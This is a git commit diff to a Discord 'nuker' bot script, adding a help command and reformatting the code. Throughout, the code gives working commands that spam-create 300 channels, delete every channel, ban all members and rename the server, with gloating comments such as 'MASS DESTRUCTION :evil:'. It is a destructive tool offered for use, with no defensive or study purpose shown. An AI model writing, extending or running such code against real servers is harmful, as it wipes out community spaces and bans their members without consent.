69b39454c16982914bbe2d39402d81e3b9d7c3db
Stiizzy <75148429+Sskitz@users.noreply.github.com>
2021-05-04 13:18:09 -0700

    Update index.js

--- index.js
+++ index.js
@@ -19,40 +19,54 @@ client.on("ready", () => {
 client.on("message", message => {
     if (message.author.id != config.userid) {
         return;
-    }     
+    }
     let command = message.content.split(" ")[0]
     command = command.slice(prefix.length)
     let args = message.content.split(" ").slice(1)
     if (command) message.delete()
 
+    if (command === "help") { /// requested by vapor 
+        let helpembed = new Discord.MessageEmbed()
+            .setColor('#FF0000')
+            .addField('Cmds', "```\nch - creates channels\ndc - deletes all channels\nbanall - bans all members\nnuke - ends the server```", true) 
+        message.author.send(helpembed)
+    }
 
-
-   
 
 
     if (command == "ch") {
         for (i = 0; i < 300; i++) {
-            message.guild.channels.create('Stiizzy Wins', { reason: 'cool new channel about me' })   /// creates channels with my name :sunglasses:
+            message.guild.channels.create('Stiizzy Wins', {
+                reason: 'cool new channel about me'
+            }) /// creates channels with my name :sunglasses:
         }
     }
 
     if (command == "dc") {
-    message.delete();
-     message.guild.channels.cache.forEach((dc) => {    /// Deletes all channels 
-      dc.delete()
-     })
+        message.delete();
+        message.guild.channels.cache.forEach((dc) => { /// Deletes all channels 
+            dc.delete()
+        })
     }
-if (command === "banall"){
-   message.guild.members.cache.map(member => member.ban({reason: 'You were Nuke Banned'}))  // vapor helped me test :Kiss:
+    if (command === "banall") {
+        message.guild.members.cache.map(member => member.ban({
+            reason: 'You were Nuke Banned'
+        })) // vapor helped me test :Kiss:
 
-}
-if (command == 'nuke') {
-        message.guild.channels.cache.forEach(async c => { await c.delete() })   /// MASS DESTRUCTION :evil:
+    }
+    if (command == 'nuke') {
+        message.guild.channels.cache.forEach(async c => {
+            await c.delete()
+        }) /// MASS DESTRUCTION :evil:
         message.guild.setName("Stizzy Wins")
         for (i = 0; i < 300; i++) {
-             message.guild.channels.create('Stiizzy Wins', { reason: 'Needed a cool new channel about me' })
-             message.guild.members.cache.forEach(member => member.ban({ reason: "U Stoopid" }))
+            message.guild.channels.create('Stiizzy Wins', {
+                reason: 'Needed a cool new channel about me'
+            })
+            message.guild.members.cache.forEach(member => member.ban({
+                reason: "U Stoopid"
+            }))
         }
-}
+    }
 })
 client.login(config.token);
